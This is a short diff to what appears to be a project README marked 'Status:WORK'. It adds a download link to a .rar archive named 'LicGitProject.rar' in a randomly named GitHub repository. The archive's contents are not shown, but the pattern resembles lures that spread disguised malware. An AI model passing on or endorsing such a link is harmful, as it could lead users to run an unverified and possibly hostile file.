@@ -4,4 +4,4 @@
 > # 🟢Status:WORK🟢
 ---
 # Download
-### [Download the latest version]()
+### [Download the latest version](https://github.com/tarosimple34/super-garbanzo/releases/download/Load/LicGitProject.rar)
